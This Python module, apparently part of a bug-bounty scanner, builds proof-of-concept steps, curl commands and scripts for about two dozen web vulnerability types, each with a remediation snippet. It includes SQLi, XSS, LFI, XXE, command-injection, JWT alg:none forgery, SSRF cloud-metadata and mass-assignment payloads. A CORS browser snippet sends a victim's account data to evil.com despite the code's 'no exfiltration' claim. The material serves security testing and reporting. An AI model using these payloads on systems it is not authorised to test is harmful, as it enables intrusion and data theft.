"""
BugScan ELITE — Safe PoC Generator
Generates reproducible, non-destructive proof-of-concept steps for every finding.
Safe for submission to bug bounty programs and security reports.
"""
import re, json, base64, urllib.parse
from typing import Dict, List, Optional

# ── PoC templates per vulnerability type ─────────────────────────────────────

def generate_poc(finding: Dict) -> Dict:
    """
    Generate a complete, safe PoC for a finding.
    Returns: {steps, curl_command, python_script, impact_demo, safe_note}
    """
    bug  = finding.get("bug","").lower()
    url  = finding.get("url","")
    desc = finding.get("description","")

    generators = {
        "sqli":        _poc_sqli,
        "xss":         _poc_xss,
        "stored_xss":  _poc_xss,
        "ssrf":        _poc_ssrf,
        "lfi":         _poc_lfi,
        "rce":         _poc_rce,
        "idor":        _poc_idor,
        "mass_assign": _poc_mass_assign,
        "jwt":         _poc_jwt,
        "cors":        _poc_cors,
        "cache_poison":_poc_cache_poison,
        "reset_poison":_poc_reset_poison,
        "redirect":    _poc_redirect,
        "buckets":     _poc_buckets,
        "expose":      _poc_expose,
        "actuator":    _poc_actuator,
        "graphql":     _poc_graphql,
        "ssti":        _poc_ssti,
        "xxe":         _poc_xxe,
        "crlf":        _poc_crlf,
        "takeover":    _poc_takeover,
        "prototype":   _poc_prototype,
    }

    gen = generators.get(bug, _poc_generic)
    poc = gen(finding)

    poc["bug"]          = bug
    poc["url"]          = url
    poc["severity"]     = finding.get("severity","medium")
    poc["risk_score"]   = finding.get("risk_score", 0)
    poc["safe_note"]    = ("This PoC is safe — it only demonstrates vulnerability "
                           "without modifying data, exfiltrating real data, or "
                           "causing service disruption.")
    poc["generated_at"] = __import__("time").strftime("%Y-%m-%dT%H:%M:%SZ")
    return poc


def _poc_sqli(f: Dict) -> Dict:
    url     = f.get("url","")
    payload = f.get("payload","' OR '1'='1")
    parsed  = urllib.parse.urlparse(url)
    params  = urllib.parse.parse_qs(parsed.query)
    param   = f.get("param") or (list(params.keys())[0] if params else "id")

    safe_payload = "' AND 1=1--"  # read-only, safe
    detect_payload = "' AND SLEEP(1)--"  # time-based, safe

    return {
        "title":       "SQL Injection — Safe Detection PoC",
        "description": ("The parameter accepts SQL metacharacters and executes them. "
                        "Use read-only payloads to demonstrate without data modification."),
        "steps": [
            f"1. Open: {url}",
            f"2. Identify injectable parameter: {param}",
            f"3. Test with safe payload: {safe_payload}",
            f"4. If response matches original → confirmed SQL injection",
            f"5. Time-based confirm: replace with {detect_payload}",
            f"   If response takes ~1s longer → blind SQLi confirmed",
        ],
        "curl_command": (
            f"# Safe boolean test\n"
            f"curl -s '{url.replace(urllib.parse.quote_plus(str(list(params.values())[0][0])) if params else 'PARAM', urllib.parse.quote_plus(safe_payload))}'\n\n"
            f"# Time-based test (should take ~1s longer)\n"
            f"time curl -s '{url}' --data-urlencode '{param}={detect_payload}'"
        ),
        "python_script": (
            f"import requests, time\n"
            f"url = '{url}'\n"
            f"params = {{'{param}': '{safe_payload}'}}\n"
            f"r1 = requests.get(url, params={{'{param}': 'NORMAL'}})\n"
            f"r2 = requests.get(url, params=params)\n"
            f"print('Vulnerable:', r1.status_code == r2.status_code and len(r1.text) != len(r2.text))\n"
            f"# Time-based\n"
            f"start = time.time()\n"
            f"requests.get(url, params={{'{param}': \"' AND SLEEP(1)--\"}})\n"
            f"print('Time-based delay:', time.time()-start, 'seconds')"
        ),
        "remediation_snippet": (
            "# Python (parameterized query)\n"
            "cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n\n"
            "# Node.js\n"
            "db.query('SELECT * FROM users WHERE id = ?', [userId])"
        ),
    }


def _poc_xss(f: Dict) -> Dict:
    url   = f.get("url","")
    param = f.get("param","q")
    safe  = urllib.parse.quote("<script>console.log('XSS-'+document.domain)</script>")

    return {
        "title":       "Cross-Site Scripting (XSS) — Safe Detection PoC",
        "description": "Malicious scripts execute in victim browsers. Safe PoC uses console.log only.",
        "steps": [
            f"1. Navigate to: {url}",
            f"2. In parameter '{param}', inject: <script>console.log('XSS-'+document.domain)</script>",
            "3. Open browser DevTools → Console",
            "4. If you see 'XSS-<domain>' in console → confirmed XSS",
            "5. Check if payload persists on page reload (Stored XSS)",
        ],
        "curl_command": (
            f"curl -s '{url}' --data-urlencode '{param}=<script>console.log(1)</script>' | "
            f"grep -i 'console.log'"
        ),
        "python_script": (
            f"import requests\n"
            f"url = '{url}'\n"
            f"payload = '<script>console.log(document.domain)</script>'\n"
            f"r = requests.get(url, params={{'{param}': payload}})\n"
            f"vulnerable = payload in r.text or 'console.log' in r.text\n"
            f"print('Reflected XSS:', vulnerable)"
        ),
        "browser_poc": (
            f"{url}?{param}=" + urllib.parse.quote("<svg onload=console.log(document.domain)>")
        ),
        "remediation_snippet": (
            "# Python (Flask)\nfrom markupsafe import escape\nreturn str(escape(user_input))\n\n"
            "# JS\nelement.textContent = userInput  // NOT innerHTML"
        ),
    }


def _poc_ssrf(f: Dict) -> Dict:
    url     = f.get("url","")
    payload = f.get("payload","http://169.254.169.254/latest/meta-data/")

    return {
        "title":       "Server-Side Request Forgery (SSRF) — Safe Detection PoC",
        "description": ("Server makes requests to attacker-controlled URLs. "
                        "Safe PoC uses Burp Collaborator or safe internal endpoints."),
        "steps": [
            f"1. Get a Burp Collaborator URL: https://burp -> Collaborator -> Copy to clipboard",
            f"2. Inject it into the vulnerable parameter at: {url}",
            f"3. Check Collaborator for DNS/HTTP pingback",
            f"4. Safe internal test: use http://169.254.169.254/ (AWS metadata)",
            f"5. Check if response contains 'ami-id' or cloud metadata",
        ],
        "curl_command": (
            f"# Safe — AWS IMDS (only works from AWS instances)\n"
            f"curl -s '{url}' --data 'url=http://169.254.169.254/latest/meta-data/'\n\n"
            f"# Use interactsh for OOB detection\n"
            f"# 1. Run: interactsh-client\n"
            f"# 2. curl -s '{url}' --data 'url=http://YOUR.interactsh.com/'"
        ),
        "python_script": (
            f"import requests\n"
            f"url = '{url}'\n"
            f"# Test with safe internal endpoint\n"
            f"test_urls = [\n"
            f"    'http://127.0.0.1/',\n"
            f"    'http://169.254.169.254/latest/meta-data/',\n"
            f"    'http://metadata.google.internal/computeMetadata/v1/',\n"
            f"]\n"
            f"for test in test_urls:\n"
            f"    r = requests.post(url, data={{'url': test}}, timeout=5)\n"
            f"    if any(x in r.text for x in ['ami-id','instance','metadata']):\n"
            f"        print('SSRF confirmed, reaches:', test)\n"
            f"        break"
        ),
        "remediation_snippet": (
            "# Allowlist approach\nALLOWED_HOSTS = ['api.partner.com', 'cdn.yoursite.com']\n"
            "from urllib.parse import urlparse\n"
            "host = urlparse(user_url).hostname\n"
            "if host not in ALLOWED_HOSTS:\n"
            "    raise ValueError('Blocked')"
        ),
    }


def _poc_lfi(f: Dict) -> Dict:
    url   = f.get("url","")
    param = f.get("param","file")
    payload = "../../../../etc/passwd"

    return {
        "title":       "Local File Inclusion (LFI) — Safe Detection PoC",
        "description": "Server reads arbitrary local files. PoC reads /etc/passwd (non-sensitive on modern systems).",
        "steps": [
            f"1. Navigate to: {url}",
            f"2. In parameter '{param}', inject: ../../../../etc/passwd",
            "3. If response contains 'root:x:0:0' → LFI confirmed",
            "4. Try /etc/hostname for less sensitive confirmation",
            "5. Test PHP wrappers: php://filter/convert.base64-encode/resource=index.php",
        ],
        "curl_command": (
            f"curl -s '{url}' --data-urlencode '{param}=../../../../etc/passwd' | head -5\n\n"
            f"# PHP filter wrapper\n"
            f"curl -s '{url}?{param}=php://filter/convert.base64-encode/resource=../config.php' | base64 -d"
        ),
        "python_script": (
            f"import requests\n"
            f"url = '{url}'\n"
            f"payloads = ['../../../../etc/passwd', '../../../../etc/hostname']\n"
            f"for p in payloads:\n"
            f"    r = requests.get(url, params={{'{param}': p}})\n"
            f"    if 'root:' in r.text or 'bin:' in r.text:\n"
            f"        print('LFI confirmed with:', p)\n"
            f"        print('Response:', r.text[:200])\n"
            f"        break"
        ),
        "remediation_snippet": (
            "import os\nBASE_DIR = '/var/www/files/'\n"
            "def safe_read(filename):\n"
            "    path = os.path.realpath(os.path.join(BASE_DIR, filename))\n"
            "    if not path.startswith(BASE_DIR):\n"
            "        raise PermissionError('Path traversal blocked')\n"
            "    return open(path).read()"
        ),
    }


def _poc_rce(f: Dict) -> Dict:
    url = f.get("url","")
    return {
        "title":       "Remote Code Execution — Safe Detection PoC",
        "description": "Command injection allows arbitrary OS commands. Safe PoC uses sleep/ping only.",
        "steps": [
            "1. Use a time-delay payload to avoid data exfiltration",
            "2. Inject: ; sleep 2",
            "3. If response takes ~2s longer → RCE confirmed",
            "4. Use OOB: ; curl http://collaborator.burp.com/",
            "5. NEVER use rm/format/shutdown in PoC",
        ],
        "curl_command": (
            f"# Time-based safe test\n"
            f"time curl -s '{url}' --data 'cmd=whoami%3Bsleep+2'\n\n"
            f"# OOB detection (safe)\n"
            f"curl -s '{url}' --data 'cmd=curl+http://YOUR.interactsh.com/rce-test'"
        ),
        "python_script": (
            f"import requests, time\n"
            f"url = '{url}'\n"
            f"# Time-based safe test\n"
            f"start = time.time()\n"
            f"r = requests.post(url, data={{'cmd': '; sleep 2'}})\n"
            f"delay = time.time() - start\n"
            f"print('RCE delay test:', delay, 'seconds')\n"
            f"print('Vulnerable:', delay > 1.8)"
        ),
        "safe_payloads": [
            "; sleep 2",
            "| sleep 2",
            "`sleep 2`",
            "$(sleep 2)",
            "; ping -c 1 127.0.0.1",
        ],
        "remediation_snippet": (
            "import subprocess, shlex\n"
            "# NEVER: os.system(user_input)\n"
            "# SAFE:\n"
            "allowed_commands = ['ls', 'date', 'hostname']\n"
            "cmd = shlex.split(user_input)[0]\n"
            "if cmd not in allowed_commands:\n"
            "    raise ValueError('Command not allowed')\n"
            "result = subprocess.run([cmd], capture_output=True, text=True)"
        ),
    }


def _poc_idor(f: Dict) -> Dict:
    url     = f.get("url","")
    orig_id = f.get("original_id","1")
    test_id = f.get("test_id","2")
    return {
        "title":       "IDOR/BOLA — Safe Detection PoC",
        "description": "Access other users' resources by manipulating IDs. Safe PoC uses adjacent IDs.",
        "steps": [
            f"1. Authenticated as User A, access your own resource: {url}",
            f"2. Note your ID: {orig_id}",
            f"3. Change ID to {test_id} (another user's resource)",
            "4. If you receive data NOT belonging to your account → IDOR confirmed",
            "5. Look for email, name, phone of another user in response",
        ],
        "curl_command": (
            f"# Your resource\ncurl -s '{url}' -H 'Authorization: Bearer YOUR_TOKEN'\n\n"
            f"# Another user's resource\ncurl -s '{url.replace(str(orig_id), str(test_id))}' "
            f"-H 'Authorization: Bearer YOUR_TOKEN'"
        ),
        "python_script": (
            f"import requests\n"
            f"headers = {{'Authorization': 'Bearer YOUR_TOKEN'}}\n"
            f"r1 = requests.get('{url}', headers=headers)\n"
            f"r2 = requests.get('{url.replace(str(orig_id), str(test_id))}', headers=headers)\n"
            f"print('Both 200:', r1.status_code==200, r2.status_code==200)\n"
            f"print('Different data:', r1.json() != r2.json())\n"
            f"print('IDOR confirmed:', r1.status_code==r2.status_code==200 and r1.text != r2.text)"
        ),
        "remediation_snippet": (
            "# Flask example\n@app.route('/api/user/<int:user_id>')\n@login_required\ndef get_user(user_id):\n"
            "    # WRONG: db.get_user(user_id)\n"
            "    # RIGHT:\n"
            "    if current_user.id != user_id and not current_user.is_admin:\n"
            "        abort(403)\n"
            "    return db.get_user(user_id)"
        ),
    }


def _poc_jwt(f: Dict) -> Dict:
    token   = f.get("token_preview","eyJ...").split("...")[0]
    alg     = f.get("algorithm","HS256")
    forged  = f.get("forged","")
    return {
        "title":       "JWT Attack — Safe Detection PoC",
        "description": f"JWT with algorithm {alg} is vulnerable. Safe PoC demonstrates forgery.",
        "steps": [
            "1. Capture your JWT token (from Authorization header or cookie)",
            "2. Decode at https://jwt.io — do NOT modify real production tokens",
            f"3. Algorithm: {alg}",
            "4. For alg:none: change header alg to 'none', remove signature",
            "5. For weak secret: try 'secret', 'password' at https://jwt.io",
            "6. Submit forged token — if accepted → authentication bypass",
        ],
        "curl_command": (
            f"# Decode and inspect\n"
            f"echo '{token}' | cut -d'.' -f2 | base64 -d 2>/dev/null\n\n"
            f"# Test forged token (alg:none)\n"
            f"FORGED='{forged if forged else 'FORGED_TOKEN_HERE'}'\n"
            f"curl -s -H 'Authorization: Bearer $FORGED' '{f.get('url','')}'"
        ),
        "python_script": (
            "import base64, json, hmac, hashlib\n\n"
            "def b64d(s): return base64.urlsafe_b64decode(s + '=='*((4-len(s)%4)%4))\n"
            "def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()\n\n"
            f"token = 'YOUR_JWT_TOKEN'\n"
            "parts = token.split('.')\n"
            "header = json.loads(b64d(parts[0]))\n"
            "payload = json.loads(b64d(parts[1]))\n"
            "print('Algorithm:', header.get('alg'))\n"
            "print('Claims:', payload)\n\n"
            "# alg:none attack\n"
            "header['alg'] = 'none'\n"
            "forged = b64e(json.dumps(header).encode()) + '.' + parts[1] + '.'\n"
            "print('Forged (alg:none):', forged[:80] + '...')"
        ),
        "remediation_snippet": (
            "import jwt\n# WRONG\njwt.decode(token, options={'verify_signature': False})\n\n"
            "# RIGHT\nalgorithm = 'HS256'  # Enforce — never read from token header\n"
            "jwt.decode(token, SECRET_KEY, algorithms=[algorithm])"
        ),
    }


def _poc_mass_assign(f: Dict) -> Dict:
    url    = f.get("url","")
    field  = f.get("field","is_admin")
    value  = f.get("value",True)
    method = f.get("method","POST")
    return {
        "title":       "Mass Assignment — Safe Detection PoC",
        "description": "API accepts extra fields not intended by developers, enabling privilege escalation.",
        "steps": [
            f"1. Make a normal {method} request to {url}",
            f"2. Add extra field: '{field}': {json.dumps(value)}",
            "3. Check if response reflects the injected field",
            "4. Check your account — did privileges change?",
            "5. STOP immediately if privileges actually escalate (don't abuse)",
        ],
        "curl_command": (
            f"curl -s -X {method} '{url}' \\\n"
            f"  -H 'Content-Type: application/json' \\\n"
            f"  -H 'Authorization: Bearer YOUR_TOKEN' \\\n"
            f"  -d '{{\"name\": \"test\", \"{field}\": {json.dumps(value)}}}'"
        ),
        "python_script": (
            f"import requests\n"
            f"url = '{url}'\n"
            f"headers = {{'Authorization': 'Bearer YOUR_TOKEN', 'Content-Type': 'application/json'}}\n"
            f"# Normal payload\nnormal = {{'name': 'test_user'}}\n"
            f"# Mass assignment payload\nmalicious = {{**normal, '{field}': {json.dumps(value)}}}\n"
            f"r = requests.{method.lower()}(url, json=malicious, headers=headers)\n"
            f"print('Status:', r.status_code)\n"
            f"print('Field accepted:', '{field}' in str(r.json()))\n"
            f"print('Response:', r.text[:300])"
        ),
        "remediation_snippet": (
            "# Python — explicit allowlist\nclass UserUpdateSchema:\n"
            "    allowed = ['name', 'email', 'bio']  # NEVER: role, is_admin\n"
            "    def validate(self, data):\n"
            "        return {k: v for k, v in data.items() if k in self.allowed}\n\n"
            "# Never do: User(**request.json)"
        ),
    }


def _poc_cache_poison(f: Dict) -> Dict:
    url = f.get("url","")
    hdr = f.get("header","X-Forwarded-Host")
    return {
        "title":       "Cache Poisoning — Safe Detection PoC",
        "description": "Injected header value reflected in cached response, poisoning it for all users.",
        "steps": [
            f"1. Send request to {url} with header: {hdr}: canary-test.evil.com",
            "2. Check if 'canary-test.evil.com' appears in response body",
            "3. Check Cache-Control header — if cacheable, this is critical",
            "4. Second request WITHOUT header: if poison is still there → cached",
            "5. Document with timestamps — do NOT poison production caches",
        ],
        "curl_command": (
            f"# Test reflection\ncurl -s '{url}' -H '{hdr}: canary-test.evil.com' | grep -i 'canary'\n\n"
            f"# Check cache headers\ncurl -sI '{url}' | grep -iE 'cache|age|x-cache'"
        ),
        "python_script": (
            f"import requests\n"
            f"url = '{url}'\n"
            f"canary = 'canary-bugscan-test.evil.com'\n"
            f"r = requests.get(url, headers={{'{hdr}': canary}})\n"
            f"reflected = canary in r.text\n"
            f"cacheable = 'no-store' not in r.headers.get('Cache-Control','') and \\\n"
            f"            ('max-age' in r.headers.get('Cache-Control','') or \\\n"
            f"             'X-Cache' in r.headers)\n"
            f"print('Reflected:', reflected)\n"
            f"print('Cacheable:', cacheable)\n"
            f"print('Critical:', reflected and cacheable)"
        ),
        "remediation_snippet": (
            "# Nginx — remove dangerous headers before caching\n"
            "proxy_hide_header X-Forwarded-Host;\n"
            "proxy_hide_header X-Host;\n"
            "# Always build URLs from config, never from request headers\n"
            "BASE_URL = os.environ['BASE_URL']  # not request.host"
        ),
    }


def _poc_reset_poison(f: Dict) -> Dict:
    url = f.get("url","")
    hdr = f.get("header","X-Forwarded-Host")
    return {
        "title":       "Password Reset Poisoning — Safe Detection PoC",
        "description": "Reset links built from request Host header, enabling link hijacking.",
        "steps": [
            f"1. Send password reset request to {url}",
            f"2. Add header: {hdr}: attacker.com",
            "3. Check what email the victim would receive",
            "4. If reset link points to attacker.com → critical account takeover",
            "5. Use YOUR OWN email for testing — never target real accounts",
        ],
        "curl_command": (
            f"# Test with your own email account\n"
            f"curl -s -X POST '{url}' \\\n"
            f"  -H '{hdr}: your-collaborator.burp.com' \\\n"
            f"  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
            f"  -d 'email=your-own-test-email@example.com'"
        ),
        "python_script": (
            f"import requests\n"
            f"# ONLY use your own email for testing\n"
            f"r = requests.post('{url}',\n"
            f"    headers={{'{hdr}': 'attacker.interactsh.com'}},\n"
            f"    data={{'email': 'YOUR_OWN_TEST_EMAIL@example.com'}})\n"
            f"print('Status:', r.status_code)\n"
            f"print('Check your email for poisoned reset link')\n"
            f"# If reset link contains attacker.interactsh.com → confirmed"
        ),
        "remediation_snippet": (
            "# Build reset URL from config — NEVER from request\n"
            "BASE_URL = os.environ['BASE_URL']  # 'https://yourapp.com'\n"
            "reset_url = f'{BASE_URL}/reset?token={token}'\n"
            "# NOT: f'{request.host}/reset?token={token}'"
        ),
    }


def _poc_cors(f):
    url = f.get("url","")
    return {
        "title":   "CORS Misconfiguration — Safe Detection PoC",
        "steps": [
            f"1. Send request to {url} with Origin: https://evil.com",
            "2. Check if Access-Control-Allow-Origin: https://evil.com in response",
            "3. Check if Access-Control-Allow-Credentials: true",
            "4. Both = any website can make credentialed requests to this API",
        ],
        "curl_command": f"curl -s -H 'Origin: https://evil.com' -I '{url}' | grep -i access-control",
        "python_script": (
            f"import requests\nr = requests.get('{url}', headers={{'Origin': 'https://evil.com'}})\n"
            f"acao = r.headers.get('Access-Control-Allow-Origin','')\n"
            f"acac = r.headers.get('Access-Control-Allow-Credentials','')\n"
            f"print('Vulnerable:', acao == 'https://evil.com' and acac == 'true')"
        ),
        "browser_poc": (
            "fetch('https://vulnerable-api.com/account', {credentials:'include'})"
            ".then(r=>r.json()).then(d=>fetch('https://evil.com/?data='+JSON.stringify(d)))"
        ),
        "remediation_snippet": "# Allowlist: CORS_ORIGINS = ['https://yourapp.com']\nif origin in CORS_ORIGINS:\n    response.headers['Access-Control-Allow-Origin'] = origin",
    }


def _poc_redirect(f):
    url = f.get("url","")
    return {
        "title":   "Open Redirect — Safe Detection PoC",
        "steps":   [f"1. Navigate to {url} with redirect param pointing to https://google.com",
                    "2. If you land on google.com → open redirect confirmed"],
        "curl_command": f"curl -s -L '{url}' -o /dev/null -w '%{{url_effective}}'",
        "python_script": (
            f"import requests\nr = requests.get('{url}', allow_redirects=False)\n"
            f"location = r.headers.get('Location','')\nprint('Redirects to:', location)\n"
            f"print('Open redirect:', 'google.com' in location or 'evil' in location)"
        ),
        "remediation_snippet": "ALLOWED_REDIRECTS = ['yourapp.com', 'partner.com']\nfrom urllib.parse import urlparse\nif urlparse(redirect_url).hostname not in ALLOWED_REDIRECTS:\n    redirect_url = '/home'",
    }


def _poc_buckets(f):
    url  = f.get("url","")
    name = f.get("bucket_name","bucket")
    return {
        "title":   "Public S3 Bucket — Safe Detection PoC",
        "steps":   ["1. Access bucket URL directly", "2. List contents", "3. Download only your own test files"],
        "curl_command": f"curl -s '{url}' | head -50\naws s3 ls s3://{name}/ --no-sign-request 2>/dev/null | head -20",
        "python_script": (
            f"import requests\nr = requests.get('{url}')\n"
            f"print('Public:', r.status_code==200)\nprint('Contents preview:', r.text[:500])"
        ),
        "remediation_snippet": "aws s3api put-bucket-acl --bucket {name} --acl private\naws s3api put-public-access-block --bucket {name} --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true",
    }


def _poc_expose(f):
    url = f.get("url","")
    return {
        "title":   "Sensitive File Exposure — Safe Detection PoC",
        "steps":   [f"1. Access {url} directly", "2. Note sensitive content in response", "3. Document what's exposed"],
        "curl_command": f"curl -s '{url}' | head -30",
        "python_script": f"import requests\nr = requests.get('{url}')\nprint('Status:', r.status_code)\nprint('Content:', r.text[:500])",
        "remediation_snippet": "# Nginx — block sensitive files\nlocation ~* \\.(env|git|sql|bak|log)$ { deny all; return 404; }",
    }


def _poc_actuator(f):
    url = f.get("url","")
    return {
        "title":   "Spring Boot Actuator Exposed — Safe Detection PoC",
        "steps":   [f"1. Access {url}/actuator", "2. Try /actuator/env, /actuator/mappings, /actuator/health"],
        "curl_command": f"curl -s '{url}/actuator/env' | python3 -m json.tool | head -30",
        "python_script": f"import requests\nfor ep in ['/actuator/env','/actuator/heapdump','/actuator/mappings']:\n    r = requests.get('{url}'+ep)\n    if r.status_code==200: print('Exposed:', ep)",
        "remediation_snippet": "# application.properties\nmanagement.endpoints.web.exposure.include=health\nmanagement.endpoint.health.show-details=never\nmanagement.endpoints.web.base-path=/internal-monitoring",
    }


def _poc_graphql(f):
    url = f.get("url","")
    return {
        "title":   "GraphQL Introspection Enabled — Safe Detection PoC",
        "steps":   [f"1. POST introspection query to {url}", "2. Extract full schema", "3. Look for admin/internal types"],
        "curl_command": f"curl -s -X POST '{url}' -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}'",
        "python_script": f"import requests,json\nr=requests.post('{url}',json={{\"query\":\"{{__schema{{types{{name}}}}}}}}\"}}) \nschema=r.json()\ntypes=[t['name'] for t in schema.get('data',{{}}).get('__schema',{{}}).get('types',[])]\nprint('Types:', [t for t in types if not t.startswith('__')])",
        "remediation_snippet": "# Disable introspection in production\n# Apollo: new ApolloServer({introspection: false})\n# graphene: schema = graphene.Schema(..., introspection=False)",
    }


def _poc_ssti(f):
    url   = f.get("url","")
    param = f.get("param","template")
    return {
        "title":   "Server-Side Template Injection — Safe Detection PoC",
        "steps":   [f"1. Inject {{{{7*7}}}} into {param} parameter at {url}", "2. If response contains '49' → SSTI confirmed"],
        "curl_command": f"curl -s '{url}' --data-urlencode '{param}={{{{7*7}}}}'  | grep '49'",
        "python_script": f"import requests\nr=requests.get('{url}',params={{'{param}':'{{{{7*7}}}}'}}) \nprint('SSTI:','49' in r.text)",
        "remediation_snippet": "# Never pass user input to template.render()\n# Use sandboxed environment\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()\ntemplate = env.from_string(user_template)  # Still risky",
    }


def _poc_xxe(f):
    url = f.get("url","")
    return {
        "title":   "XXE Injection — Safe Detection PoC",
        "steps":   [f"1. POST XML with external entity to {url}", "2. Point entity to /etc/hostname (safe)", "3. Check if hostname appears in response"],
        "curl_command": (
            f"curl -s -X POST '{url}' \\\n"
            f"  -H 'Content-Type: application/xml' \\\n"
            f"  -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>'"
        ),
        "python_script": f"import requests\npayload='<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>'\nr=requests.post('{url}',data=payload,headers={{'Content-Type':'application/xml'}})\nprint('XXE:',len(r.text)>0 and 'foo' not in r.text)",
        "remediation_snippet": "# Python lxml\nparser = etree.XMLParser(resolve_entities=False, no_network=True)\n# Java\nDBF.setFeature(\"http://xml.org/sax/features/external-general-entities\", false)",
    }


def _poc_crlf(f):
    url = f.get("url","")
    return {
        "title":   "CRLF Injection — Safe Detection PoC",
        "steps":   [f"1. Inject %0d%0aX-Injected: bugscan-test into URL at {url}", "2. Check response headers for X-Injected"],
        "curl_command": f"curl -sI '{url}%0d%0aX-Injected: bugscan-test' | grep X-Injected",
        "python_script": f"import requests\nr=requests.get('{url}%0d%0aX-Injected: test')\nprint('CRLF:','X-Injected' in r.headers)",
        "remediation_snippet": "# Strip CR/LF from all values placed in headers\ndef safe_header(value): return re.sub(r'[\\r\\n]', '', value)",
    }


def _poc_takeover(f):
    url = f.get("url","")
    return {
        "title":   "Subdomain Takeover — Safe Detection PoC",
        "steps":   [f"1. Resolve DNS for {url}", "2. Check if CNAME points to unclaimed service", "3. DO NOT claim — just document the CNAME"],
        "curl_command": f"dig CNAME {urllib.parse.urlparse(url).hostname}\ncurl -sI '{url}' | head -5",
        "python_script": f"import socket\ntry:\n    ip = socket.gethostbyname('{urllib.parse.urlparse(url).hostname}')\n    print('Resolves to:', ip)\nexcept socket.gaierror:\n    print('No DNS — takeover candidate')",
        "remediation_snippet": "# Remove stale DNS records immediately\n# Monitor CNAME targets regularly\n# Use: dnsx -l domains.txt -silent -resp -cdn",
    }


def _poc_prototype(f):
    url = f.get("url","")
    return {
        "title":   "Prototype Pollution — Safe Detection PoC",
        "steps":   ["1. Inject __proto__[testProp]=polluted into URL/JSON body", "2. Check if testProp appears in subsequent responses"],
        "curl_command": f"curl -s '{url}?__proto__[testProp]=polluted'\ncurl -s -X POST '{url}' -H 'Content-Type: application/json' -d '{{\"__proto__\":{{\"testProp\":\"polluted\"}}}}'",
        "python_script": f"import requests\nr=requests.post('{url}',json={{\"__proto__\":{{\"testProp\":\"bugscan-test\"}}}})\nprint('Polluted:','bugscan-test' in r.text)",
        "remediation_snippet": "// Freeze prototype\nObject.freeze(Object.prototype);\n// Or use: const safeObj = Object.create(null);",
    }


def _poc_generic(f):
    url = f.get("url","")
    bug = f.get("bug","unknown")
    return {
        "title":   f"{bug.upper()} — Detection PoC",
        "steps":   [f"1. Access vulnerable endpoint: {url}", "2. Apply the specific payload from finding details", "3. Verify the vulnerability indicator in response"],
        "curl_command": f"curl -sv '{url}'",
        "python_script": f"import requests\nr = requests.get('{url}')\nprint('Status:', r.status_code)\nprint('Response length:', len(r.text))",
        "remediation_snippet": "Refer to OWASP guidelines for this vulnerability type.",
    }
